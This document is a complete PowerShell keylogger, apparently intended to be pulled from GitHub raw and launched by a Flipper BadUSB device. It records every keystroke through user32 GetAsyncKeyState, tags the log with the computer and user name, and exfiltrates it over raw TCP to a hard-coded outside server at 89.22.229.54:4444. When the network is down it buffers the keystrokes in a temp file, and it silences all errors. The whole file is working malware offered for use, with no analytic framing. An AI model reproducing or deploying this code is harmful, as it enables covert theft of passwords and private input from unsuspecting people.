# keylogger.ps1 - loaded from GitHub raw by Flipper BadUSB
# Exfil: TCP 89.22.229.54:4444 (plain text keystrokes + host banner)
# Fail closed on network errors; keep logging to %TEMP%\kl.buf offline

$ErrorActionPreference = 'SilentlyContinue'

# --- config (text-edit only) ---
$ServerIP      = '89.22.229.54'
$ServerPort    = 4444
$ConnectMs     = 3000
$FlushEvery    = 24          # chars before forced TCP push
$TimerMs       = 10000       # also push on interval
$BufPath       = Join-Path $env:TEMP 'kl.buf'
$MaxBufBytes   = 256KB

function Send-Log {
    param([string]$Data)
    if ([string]::IsNullOrEmpty($Data)) { return $false }
    $client = $null
    $stream = $null
    try {
        $client = New-Object System.Net.Sockets.TcpClient
        $iar = $client.BeginConnect($ServerIP, $ServerPort, $null, $null)
        if (-not $iar.AsyncWaitHandle.WaitOne($ConnectMs, $false)) {
            try { $client.Close() } catch {}
            return $false
        }
        $client.EndConnect($iar)
        $stream = $client.GetStream()
        $stream.WriteTimeout = $ConnectMs
        $bytes = [Text.Encoding]::UTF8.GetBytes($Data)
        $stream.Write($bytes, 0, $bytes.Length)
        $stream.Flush()
        return $true
    } catch {
        return $false
    } finally {
        if ($stream) { try { $stream.Close() } catch {} }
        if ($client) { try { $client.Close() } catch {} }
    }
}

function Append-Local {
    param([string]$Data)
    try {
        $fi = Get-Item -LiteralPath $BufPath -ErrorAction SilentlyContinue
        if ($fi -and $fi.Length -gt $MaxBufBytes) {
            # rotate: keep tail so disk does not grow forever
            $tail = [IO.File]::ReadAllText($BufPath)
            if ($tail.Length -gt 8192) {
                $tail = $tail.Substring($tail.Length - 8192)
            }
            [IO.File]::WriteAllText($BufPath, $tail + $Data)
        } else {
            [IO.File]::AppendAllText($BufPath, $Data, [Text.Encoding]::UTF8)
        }
    } catch {}
}

function Flush-Queue {
    param([System.Text.StringBuilder]$Sb)
    if ($Sb.Length -eq 0) { return }
    $chunk = $Sb.ToString()
    if (Send-Log $chunk) {
        [void]$Sb.Clear()
    } else {
        Append-Local $chunk
        [void]$Sb.Clear()
    }
}

# Win32 poll - no admin required for GetAsyncKeyState
$member = @'
[DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
[DllImport("user32.dll")] public static extern short GetKeyState(int nVirtKey);
'@
$API = Add-Type -MemberDefinition $member -Name 'KLApi' -Namespace 'FlipperKL' -PassThru

function Map-Key([int]$vk) {
    switch ($vk) {
        0x08 { return '[BS]' }
        0x09 { return '[TAB]' }
        0x0D { return "[ENT]`n" }
        0x1B { return '[ESC]' }
        0x20 { return ' ' }
        0x2E { return '[DEL]' }
        0x25 { return '[LEFT]' }
        0x26 { return '[UP]' }
        0x27 { return '[RIGHT]' }
        0x28 { return '[DOWN]' }
        0x14 { return '[CAPS]' }
        0x5B { return '[WIN]' }
        0x5C { return '[WIN]' }
        0x10 { return '' }  # shift alone
        0xA0 { return '' }
        0xA1 { return '' }
        0x11 { return '[CTRL]' }
        0xA2 { return '[CTRL]' }
        0xA3 { return '[CTRL]' }
        0x12 { return '[ALT]' }
        0xA4 { return '[ALT]' }
        0xA5 { return '[ALT]' }
    }
    $shift = ($API::GetKeyState(0x10) -band 0x8000) -ne 0
    # digits
    if ($vk -ge 0x30 -and $vk -le 0x39) {
        if (-not $shift) { return [string][char]$vk }
        $sh = ')!@#$%^&*('
        return $sh.Substring($vk - 0x30, 1)
    }
    # letters
    if ($vk -ge 0x41 -and $vk -le 0x5A) {
        $caps = ($API::GetKeyState(0x14) -band 0x0001) -ne 0
        $upper = $caps -xor $shift
        if ($upper) { return [string][char]$vk }
        return [string][char]($vk + 32)
    }
    # OEM US
    switch ($vk) {
        0xBA { if ($shift) { return ':' } else { return ';' } }
        0xBB { if ($shift) { return '+' } else { return '=' } }
        0xBC { if ($shift) { return '<' } else { return ',' } }
        0xBD { if ($shift) { return '_' } else { return '-' } }
        0xBE { if ($shift) { return '>' } else { return '.' } }
        0xBF { if ($shift) { return '?' } else { return '/' } }
        0xC0 { if ($shift) { return '~' } else { return '`' } }
        0xDB { if ($shift) { return '{' } else { return '[' } }
        0xDC { if ($shift) { return '|' } else { return '\' } }
        0xDD { if ($shift) { return '}' } else { return ']' } }
        0xDE { if ($shift) { return '"' } else { return "'" } }
    }
    if ($vk -ge 0x70 -and $vk -le 0x7B) {
        return '[F' + ($vk - 0x6F) + ']'
    }
    return $null
}

# banner once
$banner = "--- host=$env:COMPUTERNAME user=$env:USERNAME ts=$([DateTime]::UtcNow.ToString('o')) ---`n"
Send-Log $banner | Out-Null
Append-Local $banner

$sb = New-Object System.Text.StringBuilder 2048
$lastFlush = [Environment]::TickCount

while ($true) {
    for ($k = 8; $k -le 255; $k++) {
        # bit0 = just pressed (edge)
        $st = $API::GetAsyncKeyState($k)
        if (($st -band 0x0001) -eq 0) { continue }
        $ch = Map-Key $k
        if ($null -eq $ch -or $ch -eq '') { continue }
        [void]$sb.Append($ch)
        if ($sb.Length -ge $FlushEvery) {
            Flush-Queue $sb
            $lastFlush = [Environment]::TickCount
        }
    }
    $now = [Environment]::TickCount
    if (($now - $lastFlush) -ge $TimerMs) {
        Flush-Queue $sb
        # try drain offline buffer if network returned
        try {
            if (Test-Path -LiteralPath $BufPath) {
                $offline = [IO.File]::ReadAllText($BufPath)
                if ($offline.Length -gt 0 -and (Send-Log $offline)) {
                    Remove-Item -LiteralPath $BufPath -Force
                }
            }
        } catch {}
        $lastFlush = $now
    }
    Start-Sleep -Milliseconds 8
}
